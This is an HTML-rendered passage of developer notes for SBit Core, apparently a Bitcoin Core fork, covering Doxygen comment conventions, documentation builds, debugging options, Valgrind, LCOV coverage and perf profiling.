viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>A complete list of <code>@xxx</code> commands can be found at <a href="http://www.doxygen.nl/manual/commands.html" target="_blank" rel="noopener noreferrer">http://www.doxygen.nl/manual/commands.html</a>.
As Doxygen recognizes the comments by the delimiters (<code>/**</code> and <code>*/</code> in this case), you don&#x27;t
<em>need</em> to provide any commands for a comment to be valid; just a description text is fine.</p><p>To describe a class, use the same construct above the class definition:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">/**</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * Alerts are for notifying old versions if they become too obsolete and</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * need to upgrade. The message is displayed in the status bar.</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * @see GetWarnings()</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">class</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(78, 201, 176)">CAlert</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>To describe a member or variable use:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">//! Description before the member</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> var</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>or</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> var</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(106, 153, 85)">//!&lt; Description after the member</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Also OK:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">///</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">/// ... Description ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">///</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">function2</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token plain"> arg1</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">char</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">*</span><span class="token plain">arg2</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Not picked up by Doxygen:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">//</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// ... Description ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">//</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Also not picked up by Doxygen:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">/*</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> * ... Description ...</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)"> */</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>A full list of comment syntaxes picked up by Doxygen can be found at <a href="http://www.doxygen.nl/manual/docblocks.html" target="_blank" rel="noopener noreferrer">http://www.doxygen.nl/manual/docblocks.html</a>,
but the above styles are favored.</p><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><ul><li>Avoiding duplicating type and input/output information in function
descriptions.</li></ul></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><ul><li>Use backticks (<!-- -->`<!-- -->`<!-- -->) to refer to <code>argument</code> names in function and
parameter descriptions.</li></ul></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><ul><li>Backticks aren&#x27;t required when referring to functions Doxygen already knows
about; it will build hyperlinks for these automatically. See
<a href="http://www.doxygen.nl/manual/autolink.html" target="_blank" rel="noopener noreferrer">http://www.doxygen.nl/manual/autolink.html</a> for complete info.</li></ul></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><ul><li>Avoid linking to external documentation; links can break.</li></ul></div></div><div class="admonition admonition-tip alert alert--success"><div class="admonition-heading"><h5><span class="admonition-icon"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="16" viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</h5></div><div class="admonition-content"><ul><li>Javadoc and all valid Doxygen comments are stripped from Doxygen source code
previews (<code>STRIP_CODE_COMMENTS = YES</code> in &#x27;Doxyfile.in&#x27;). If
you want a comment to be preserved, it must instead use <code>//</code> or <code>/* */</code>.</li></ul></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="generating-documentation">Generating Documentation<a class="hash-link" href="#generating-documentation" title="Direct link to heading">​</a></h3><p>The documentation can be generated with <code>make docs</code> and cleaned up with <code>make
clean-docs</code>. The resulting files are located in <code>doc/doxygen/html</code>; open
<code>index.html</code> in that directory to view the homepage.</p><p>Before running <code>make docs</code>, you&#x27;ll need to install these dependencies:</p><p>Linux: </p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">apt</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">install</span><span class="token plain"> doxygen graphviz</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">brew </span><span class="token function" style="color:rgb(220, 220, 170)">install</span><span class="token plain"> doxygen graphviz`</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="development-tips-and-tricks">Development tips and tricks<a class="hash-link" href="#development-tips-and-tricks" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_mojV" id="compiling-for-debugging">Compiling for debugging<a class="hash-link" href="#compiling-for-debugging" title="Direct link to heading">​</a></h3><p>Run configure with <code>--enable-debug</code> to add additional compiler flags that
produce better debugging builds.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="compiling-for-gprof-profiling">Compiling for gprof profiling<a class="hash-link" href="#compiling-for-gprof-profiling" title="Direct link to heading">​</a></h3><p>Run configure with the <code>--enable-gprof</code> option, then make.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="debuglog">debug.log<a class="hash-link" href="#debuglog" title="Direct link to heading">​</a></h3><p>If the code is behaving strangely, take a look in the <code>debug.log</code> file in the data directory;
error and debugging messages are written there.</p><p>The <code>-debug=...</code> command-line option controls debugging; running with just <code>-debug</code> or <code>-debug=1</code> will turn
on all categories (and give you a very large <code>debug.log</code> file).</p><p>The Qt code routes <code>qDebug()</code> output to <code>debug.log</code> under category &quot;qt&quot;: run with <code>-debug=qt</code>
to see it.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="testnet-and-regtest-modes">Testnet and Regtest modes<a class="hash-link" href="#testnet-and-regtest-modes" title="Direct link to heading">​</a></h3><p>Run with the <code>-testnet</code> option to run with &quot;play sbit&quot; on the test network, if you
are testing multi-machine code that needs to operate across the internet.</p><p>If you are testing something that can run on one machine, run with the <code>-regtest</code> option.
In regression test mode, blocks can be created on-demand; see <code>test/functional/</code> for tests
that run in <code>-regtest</code> mode.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="debug_lockorder">DEBUG_LOCKORDER<a class="hash-link" href="#debug_lockorder" title="Direct link to heading">​</a></h3><p>SBit Core is a multi-threaded application, and deadlocks or other
multi-threading bugs can be very difficult to track down. The <code>--enable-debug</code>
configure option adds <code>-DDEBUG_LOCKORDER</code> to the compiler flags. This inserts
run-time checks to keep track of which locks are held and adds warnings to the
<code>debug.log</code> file if inconsistencies are detected.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="valgrind-suppressions-file">Valgrind suppressions file<a class="hash-link" href="#valgrind-suppressions-file" title="Direct link to heading">​</a></h3><p>Valgrind is a programming tool for memory debugging, memory leak detection, and
profiling. The repo contains a Valgrind suppressions file
(<a href="https://github.com/bitcoin/bitcoin/blob/master/contrib/valgrind.supp" target="_blank" rel="noopener noreferrer"><code>valgrind.supp</code></a>)
which includes known Valgrind warnings in our dependencies that cannot be fixed
in-tree. Example use:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ valgrind --suppressions</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">contrib/valgrind.supp src/test/test_bitcoin</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ valgrind --suppressions</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">contrib/valgrind.supp --leak-check</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">full </span><span class="token punctuation" style="color:rgb(212, 212, 212)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">      --show-leak-kinds</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">all src/test/test_bitcoin --log_level</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">test_suite</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ valgrind -v --leak-check</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">full src/bitcoind -printtoconsole</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ ./test/functional/test_runner.py --valgrind</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="compiling-for-test-coverage">Compiling for test coverage<a class="hash-link" href="#compiling-for-test-coverage" title="Direct link to heading">​</a></h3><p>LCOV can be used to generate a test coverage report based upon <code>make check</code>
execution. LCOV must be installed on your system (e.g. the <code>lcov</code> package
on Debian/Ubuntu).</p><p>To enable LCOV report generation during test runs:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">./configure --enable-lcov</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token function" style="color:rgb(220, 220, 170)">make</span><span class="token plain"> cov</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)"># A coverage report will now be accessible at `./test_bitcoin.coverage/index.html`.</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="performance-profiling-with-perf">Performance profiling with perf<a class="hash-link" href="#performance-profiling-with-perf" title="Direct link to heading">​</a></h3><p>Profiling is a good way to get a precise idea of where time is being spent in
code. One tool for doing profiling on Linux platforms is called
<a href="http://www.brendangregg.com/perf.html" target="_blank" rel="noopener noreferrer"><code>perf</code></a>, and has been integrated into
the functional test framework. Perf can observe a running process and sample
(at some frequency) where its execution is.</p><p>Perf installation is contingent on which kernel version you&#x27;re running; see
<a href="https://askubuntu.com/questions/50145/how-to-install-perf-monitoring-tool" target="_blank" rel="noopener noreferrer">this thread</a>
for specific instructions.</p><p>Certain kernel parameters may need to be set for perf to be able to inspect the
running process&#x27;s stack.</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ </span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> sysctl -w kernel.perf_event_paranoid</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain">-1</span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ </span><span class="token function" style="color:rgb(220, 220, 170)">sudo</span><span class="token plain"> sysctl -w kernel.kptr_restrict</span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token number" style="color:rgb(181, 206, 168)">0</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Make sure you <a href="https://lwn.net/Articles/420403/" target="_blank" rel="noopener noreferrer">understand the security
trade-offs</a> of setting these kernel
parameters.</p><p>To profile a running sbitd process for 60 seconds, you could use an
invocation of <code>perf record</code> like this:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ perf record </span><span class="token punctuation" style="color:rgb(212, 212, 212)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    -g --call-graph dwarf --per-thread -F </span><span class="token number" style="color:rgb(181, 206, 168)">140</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    -p </span><span class="token variable" style="color:rgb(156, 220, 254)">`</span><span class="token variable" style="color:rgb(156, 220, 254)">pgrep sbitd</span><span class="token variable" style="color:rgb(156, 220, 254)">`</span><span class="token plain"> -- </span><span class="token function" style="color:rgb(220, 220, 170)">sleep</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">60</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>You could then analyze the results by running:</p><div class="codeBlockContainer_I0IT language-shell theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-shell codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">perf report --stdio </span><span class="token operator" style="color:rgb(212, 212, 212)">|</span><span class="token plain"> c++filt </span><span class="token operator" style="color:rgb(212, 212, 212)">|</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">less</span><br></span></code></pre><button type="button" 